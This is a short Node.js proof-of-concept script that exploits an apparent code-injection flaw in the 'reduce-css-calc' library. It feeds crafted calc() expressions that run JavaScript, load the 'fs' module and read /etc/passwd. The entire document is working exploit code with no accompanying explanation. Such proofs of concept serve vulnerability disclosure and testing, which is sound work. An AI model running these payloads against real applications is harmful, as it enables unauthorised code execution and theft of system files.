const reduceCSSCalc = require('reduce-css-calc');
console.log(reduceCSSCalc(`calc(                       (Buffer(10000)))`));
console.log(reduceCSSCalc(`calc(                       (global['fs'] = require('fs')))`));
console.log(reduceCSSCalc(`calc(                       (fs['readFileSync']("/etc/passwd", "utf-8")))`));
